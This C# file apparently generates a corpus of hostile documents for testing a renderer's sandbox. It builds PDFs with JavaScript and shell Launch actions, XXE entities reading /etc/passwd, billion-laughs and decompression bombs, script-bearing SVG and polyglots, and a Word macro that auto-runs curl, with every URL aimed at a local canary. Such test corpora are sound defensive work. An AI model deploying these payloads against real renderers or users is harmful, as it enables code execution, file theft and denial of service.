using System.Buffers.Binary;
using System.Globalization;
using System.Text;

namespace Opportunity.DataGenerator.Corpus.Volumes;

/// <summary>
/// Hostile inputs for the render sandbox tests (E11-T03), generated in memory: no file in the repository and nothing
/// downloaded. Each one imitates a known attack class against document renderers. URLs point at a canary
/// (<paramref name="canary"/>, e.g. <c>http://127.0.0.1:port/</c>) so a test can prove no connection was made. The
/// files are small (the bombs are bombs only once decompressed).
/// </summary>
public static class HostileFiles
{
    /// <summary>The corpus: name, bytes and what a safe renderer may do with it.</summary>
    public static IReadOnlyList<HostileFile> All(string canary) =>
    [
        new("pdf-javascript", PdfWithActiveContent(canary), HostileOutcome.Renders),
        new("pdf-external-stream", PdfWithExternalStream(canary), HostileOutcome.RendersOrFails),
        new("pdf-xmp-xxe", PdfWithXxeMetadata(canary), HostileOutcome.Renders),
        new("pdf-flate-bomb", PdfImageBomb(12_000), HostileOutcome.RendersOrFails),
        new("pdf-html-polyglot", PdfHtmlPolyglot(canary), HostileOutcome.Renders),
        new("png-html-polyglot", PageImages.Png($"<html><script src=\"{canary}png\"></script></html>", 200, 100, 72), HostileOutcome.Renders),
        new("jpeg-zip-polyglot", [.. PageImages.Jpeg("jpeg"), .. StoredZip.Create([("evil.html", Encoding.UTF8.GetBytes("<script>alert(1)</script>"))])], HostileOutcome.Renders),
        new("png-decompression-bomb", PngBomb(100_000), HostileOutcome.FailsPage),
        new("tiff-decompression-bomb", TiffBomb(200_000), HostileOutcome.FailsPage),
        new("svg-script", Encoding.UTF8.GetBytes(SvgWithScript(canary)), HostileOutcome.Fails),
        new("xml-xxe", Encoding.UTF8.GetBytes(XmlWithExternalEntities(canary)), HostileOutcome.Fails),
        new("html", Encoding.UTF8.GetBytes($"<!doctype html><html><body onload=\"fetch('{canary}html')\"><script>document.write('x')</script></body></html>"), HostileOutcome.Fails),
        new("office-macro", OfficeWithMacro(canary), HostileOutcome.Fails),
        new("pdf-truncated", PdfWithActiveContent(canary)[..200], HostileOutcome.Fails),
    ];

    /// <summary>
    /// A one-page PDF that tries to run JavaScript and reach the network: document open action, named JavaScript,
    /// page and annotation actions (JavaScript, URI, Launch, SubmitForm, GoToR), an AcroForm with XFA.
    /// </summary>
    public static byte[] PdfWithActiveContent(string canary)
    {
        var js = $"app.launchURL('{canary}js', true); this.submitForm('{canary}submit'); var x = new XMLHttpRequest();";
        var pdf = new PdfBuilder();
        var content = pdf.AddStream("", Encoding.ASCII.GetBytes("BT /F1 24 Tf 72 700 Td (Active content test) Tj ET"));
        var font = pdf.Add("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>");
        var jsAction = pdf.Add($"<< /S /JavaScript /JS ({Escape(js)}) >>");
        var uri = pdf.Add($"<< /S /URI /URI ({canary}uri) >>");
        var launch = pdf.Add("<< /S /Launch /F (/bin/sh) /Win << /F (cmd.exe) /P (/c calc) >> >>");
        var submit = pdf.Add($"<< /S /SubmitForm /F << /FS /URL /F ({canary}form) >> /Flags 4 >>");
        var remote = pdf.Add($"<< /S /GoToR /F << /FS /URL /F ({canary}remote.pdf) >> /D [0 /Fit] >>");
        var xfa = pdf.AddStream("", Encoding.UTF8.GetBytes(
            $"<xdp:xdp xmlns:xdp=\"http://ns.adobe.com/xdp/\"><template><subform><event activity=\"initialize\"><script contentType=\"application/x-javascript\">xfa.host.gotoURL('{canary}xfa')</script></event></subform></template></xdp:xdp>"));
        var link = pdf.Add($"<< /Type /Annot /Subtype /Link /Rect [72 600 300 640] /A {uri} 0 R /Border [0 0 0] >>");
        var widget = pdf.Add($"<< /Type /Annot /Subtype /Widget /FT /Btn /T (go) /Rect [72 500 200 540] /A {submit} 0 R /AA << /E {jsAction} 0 R /Fo {launch} 0 R >> >>");
        var page = pdf.Add($"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 {font} 0 R >> >> /Contents {content} 0 R /Annots [{link} 0 R {widget} 0 R] /AA << /O {jsAction} 0 R /C {remote} 0 R >> >>");
        var names = pdf.Add($"<< /Names [(open) {jsAction} 0 R] >>");
        pdf.SetPages($"<< /Type /Pages /Kids [{page} 0 R] /Count 1 >>");
        pdf.SetCatalog($"<< /Type /Catalog /Pages 2 0 R /OpenAction {jsAction} 0 R /AA << /WC {launch} 0 R >> /Names << /JavaScript {names} 0 R >> /AcroForm << /Fields [{widget} 0 R] /XFA {xfa} 0 R /NeedsRendering true >> >>");
        return pdf.Build();
    }

    /// <summary>A page whose image XObject's data lives at a URL (a PDF external stream, /F with a URL file spec).</summary>
    public static byte[] PdfWithExternalStream(string canary)
    {
        var pdf = new PdfBuilder();
        var image = pdf.AddStream($"/Type /XObject /Subtype /Image /Width 10 /Height 10 /ColorSpace /DeviceGray /BitsPerComponent 8 /F << /FS /URL /F ({canary}external) >>", []);
        var content = pdf.AddStream("", Encoding.ASCII.GetBytes("q 200 0 0 200 72 500 cm /Im1 Do Q"));
        var page = pdf.Add($"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /XObject << /Im1 {image} 0 R >> >> /Contents {content} 0 R >>");
        pdf.SetPages($"<< /Type /Pages /Kids [{page} 0 R] /Count 1 >>");
        pdf.SetCatalog("<< /Type /Catalog /Pages 2 0 R >>");
        return pdf.Build();
    }

    /// <summary>A PDF whose XMP metadata declares external entities (XXE) pointing at the canary and at a local file.</summary>
    public static byte[] PdfWithXxeMetadata(string canary)
    {
        var pdf = new PdfBuilder();
        var metadata = pdf.AddStream("/Type /Metadata /Subtype /XML", Encoding.UTF8.GetBytes(XmlWithExternalEntities(canary)));
        var content = pdf.AddStream("", Encoding.ASCII.GetBytes("0.5 g 72 72 144 72 re f"));
        var page = pdf.Add($"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents {content} 0 R >>");
        pdf.SetPages($"<< /Type /Pages /Kids [{page} 0 R] /Count 1 >>");
        pdf.SetCatalog($"<< /Type /Catalog /Pages 2 0 R /Metadata {metadata} 0 R >>");
        return pdf.Build();
    }

    /// <summary>A page drawing one <paramref name="side"/>² 8-bit gray image whose Flate data is all zeros (a few MB on disk, side² bytes decoded).</summary>
    public static byte[] PdfImageBomb(int side)
    {
        var pdf = new PdfBuilder();
        var data = PageImages.ZlibZeros((long)side * side);
        var image = pdf.AddStream(
            string.Create(CultureInfo.InvariantCulture, $"/Type /XObject /Subtype /Image /Width {side} /Height {side} /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter /FlateDecode"),
            data);
        var content = pdf.AddStream("", Encoding.ASCII.GetBytes("q 612 0 0 792 0 0 cm /Im1 Do Q"));
        var page = pdf.Add($"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /XObject << /Im1 {image} 0 R >> >> /Contents {content} 0 R >>");
        pdf.SetPages($"<< /Type /Pages /Kids [{page} 0 R] /Count 1 >>");
        pdf.SetCatalog("<< /Type /Catalog /Pages 2 0 R >>");
        return pdf.Build();
    }

    /// <summary>A page with <paramref name="operations"/> stroked curves (Flate-compressed): expensive to rasterize.</summary>
    public static byte[] PdfSlowPage(int operations)
    {
        var builder = new StringBuilder("0.1 w ");
        for (var i = 0; i < operations; i++)
        {
            var a = i % 600;
            var b = (i * 7) % 780;
            builder.Append(CultureInfo.InvariantCulture, $"{a} {b} m {600 - a} {780 - b} {b % 600} {a} {a} {b % 780} c S ");
        }

        var pdf = new PdfBuilder();
        var raw = Encoding.ASCII.GetBytes(builder.ToString());
        using var compressed = new MemoryStream();
        using (var z = new System.IO.Compression.ZLibStream(compressed, System.IO.Compression.CompressionLevel.Fastest, leaveOpen: true))
        {
            z.Write(raw);
        }

        var content = pdf.AddStream("/Filter /FlateDecode", compressed.ToArray());
        var page = pdf.Add($"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents {content} 0 R >>");
        pdf.SetPages($"<< /Type /Pages /Kids [{page} 0 R] /Count 1 >>");
        pdf.SetCatalog("<< /Type /Catalog /Pages 2 0 R >>");
        return pdf.Build();
    }

    /// <summary>A valid PDF that is also an HTML document with script (bytes after the header comment).</summary>
    public static byte[] PdfHtmlPolyglot(string canary)
    {
        var pdf = new PdfBuilder { HeaderComment = $"%<html><body><script>fetch('{canary}polyglot')</script></body></html>" };
        var content = pdf.AddStream("", Encoding.ASCII.GetBytes("0 g 72 72 144 72 re f"));
        var page = pdf.Add($"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents {content} 0 R >>");
        pdf.SetPages($"<< /Type /Pages /Kids [{page} 0 R] /Count 1 >>");
        pdf.SetCatalog("<< /Type /Catalog /Pages 2 0 R >>");
        return pdf.Build();
    }

    /// <summary>A PNG header claiming <paramref name="side"/>² pixels (a decompression bomb) with a small zero IDAT.</summary>
    public static byte[] PngBomb(int side)
    {
        using var ms = new MemoryStream();
        ms.Write([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
        var ihdr = new byte[13];
        BinaryPrimitives.WriteUInt32BigEndian(ihdr, (uint)side);
        BinaryPrimitives.WriteUInt32BigEndian(ihdr.AsSpan(4), (uint)side);
        ihdr[8] = 8;
        ihdr[9] = 2;
        Chunk(ms, "IHDR", ihdr);
        Chunk(ms, "IDAT", PageImages.ZlibZeros(1 << 20));
        Chunk(ms, "IEND", []);
        return ms.ToArray();
    }

    /// <summary>A little-endian TIFF claiming a <paramref name="side"/>² 8-bit RGB frame with one tiny strip.</summary>
    public static byte[] TiffBomb(int side)
    {
        using var ms = new MemoryStream();
        var w = new BinaryWriter(ms);
        w.Write("II"u8);
        w.Write((ushort)42);
        w.Write(8u);
        (ushort Tag, ushort Type, uint Count, uint Value)[] entries =
        [
            (256, 4, 1, (uint)side), // ImageWidth
            (257, 4, 1, (uint)side), // ImageLength
            (258, 3, 1, 8), // BitsPerSample
            (259, 3, 1, 1), // Compression: none
            (262, 3, 1, 1), // Photometric: min-is-black
            (273, 4, 1, 8 + 2 + (11 * 12) + 4), // StripOffsets
            (277, 3, 1, 1), // SamplesPerPixel
            (278, 4, 1, (uint)side), // RowsPerStrip
            (279, 4, 1, 16), // StripByteCounts (a lie)
            (282, 5, 1, 0), // XResolution (offset patched below)
            (296, 3, 1, 2), // ResolutionUnit
        ];
        w.Write((ushort)entries.Length);
        foreach (var (tag, type, count, value) in entries)
        {
            w.Write(tag);
            w.Write(type);
            w.Write(count);
            w.Write(tag == 282 ? 8u + 2 + (11 * 12) + 4 + 16 : value);
        }

        w.Write(0u);
        w.Write(new byte[16]);
        w.Write(300u);
        w.Write(1u);
        return ms.ToArray();
    }

    /// <summary>SVG with inline script, event handlers and external references.</summary>
    public static string SvgWithScript(string canary) =>
        $"""
        <?xml version="1.0"?>
        <!DOCTYPE svg [<!ENTITY xxe SYSTEM "{canary}svg-xxe">]>
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="fetch('{canary}svg-onload')">
          <script>fetch('{canary}svg-script')</script>
          <image xlink:href="{canary}svg-image" width="10" height="10"/>
          <foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="{canary}svg-iframe"></iframe></foreignObject>
          <text>&xxe;</text>
        </svg>
        """;

    /// <summary>XML with external entities (XXE) to the canary and to a local file, and a billion-laughs expansion.</summary>
    public static string XmlWithExternalEntities(string canary) =>
        $"""
        <?xml version="1.0"?>
        <!DOCTYPE x [
          <!ENTITY remote SYSTEM "{canary}xxe">
          <!ENTITY local SYSTEM "file:///etc/passwd">
          <!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
        ]>
        <x:xmpmeta xmlns:x="adobe:ns:meta/">&remote;&local;&c;</x:xmpmeta>
        """;

    /// <summary>A macro-enabled Word document (OOXML with a VBA project that auto-runs a shell command).</summary>
    public static byte[] OfficeWithMacro(string canary) => StoredZip.Create(
    [
        ("[Content_Types].xml", Encoding.UTF8.GetBytes(
            "<?xml version=\"1.0\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">"
            + "<Default Extension=\"bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>"
            + "<Override PartName=\"/word/document.xml\" ContentType=\"application/vnd.ms-word.document.macroEnabled.main+xml\"/></Types>")),
        ("word/document.xml", Encoding.UTF8.GetBytes(
            $"<?xml version=\"1.0\"?><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body><w:p><w:r><w:t>Macro</w:t></w:r></w:p><w:p><w:fldSimple w:instr=\"INCLUDETEXT &quot;{canary}doc&quot;\"/></w:p></w:body></w:document>")),
        ("word/vbaProject.bin", Encoding.ASCII.GetBytes($"Attribute VB_Name = \"ThisDocument\"\r\nSub AutoOpen()\r\nShell \"curl {canary}macro\"\r\nEnd Sub\r\n")),
    ]);

    private static void Chunk(Stream s, string type, ReadOnlySpan<byte> data)
    {
        Span<byte> length = stackalloc byte[4];
        BinaryPrimitives.WriteUInt32BigEndian(length, (uint)data.Length);
        s.Write(length);
        var typeBytes = Encoding.ASCII.GetBytes(type);
        s.Write(typeBytes);
        s.Write(data);
        var crc = Crc32.Update(Crc32.Update(0xFFFFFFFFu, typeBytes), data) ^ 0xFFFFFFFFu;
        BinaryPrimitives.WriteUInt32BigEndian(length, crc);
        s.Write(length);
    }

    private static string Escape(string text) =>
        text.Replace("\\", "\\\\", StringComparison.Ordinal).Replace("(", "\\(", StringComparison.Ordinal).Replace(")", "\\)", StringComparison.Ordinal);

    /// <summary>A minimal PDF writer: object 1 is the catalog, object 2 the page tree.</summary>
    private sealed class PdfBuilder
    {
        private readonly List<byte[]> _objects = [[], []];

        public string? HeaderComment { get; init; }

        public int Add(string body)
        {
            _objects.Add(Encoding.ASCII.GetBytes(body));
            return _objects.Count;
        }

        public int AddStream(string dictionary, byte[] data)
        {
            var head = Encoding.ASCII.GetBytes(string.Create(CultureInfo.InvariantCulture, $"<< {dictionary} /Length {data.Length} >>\nstream\n"));
            _objects.Add([.. head, .. data, .. "\nendstream"u8]);
            return _objects.Count;
        }

        public void SetCatalog(string body) => _objects[0] = Encoding.ASCII.GetBytes(body);

        public void SetPages(string body) => _objects[1] = Encoding.ASCII.GetBytes(body);

        public byte[] Build()
        {
            using var ms = new MemoryStream();
            void Write(string s) => ms.Write(Encoding.ASCII.GetBytes(s));
            Write("%PDF-1.7\n");
            if (HeaderComment is not null)
            {
                Write(HeaderComment + "\n");
            }

            var offsets = new List<long>();
            for (var i = 0; i < _objects.Count; i++)
            {
                offsets.Add(ms.Position);
                Write(string.Create(CultureInfo.InvariantCulture, $"{i + 1} 0 obj\n"));
                ms.Write(_objects[i]);
                Write("\nendobj\n");
            }

            var xref = ms.Position;
            Write(string.Create(CultureInfo.InvariantCulture, $"xref\n0 {_objects.Count + 1}\n0000000000 65535 f \n"));
            foreach (var offset in offsets)
            {
                Write(string.Create(CultureInfo.InvariantCulture, $"{offset:D10} 00000 n \n"));
            }

            Write(string.Create(CultureInfo.InvariantCulture, $"trailer\n<< /Size {_objects.Count + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n"));
            return ms.ToArray();
        }
    }
}

public enum HostileOutcome
{
    /// <summary>Renders (its active content is ignored).</summary>
    Renders,

    /// <summary>Either renders or fails safely.</summary>
    RendersOrFails,

    /// <summary>Its page fails (the source opens, the frame is refused).</summary>
    FailsPage,

    /// <summary>The whole source is refused.</summary>
    Fails,
}

public sealed record HostileFile(string Name, byte[] Bytes, HostileOutcome Expected);
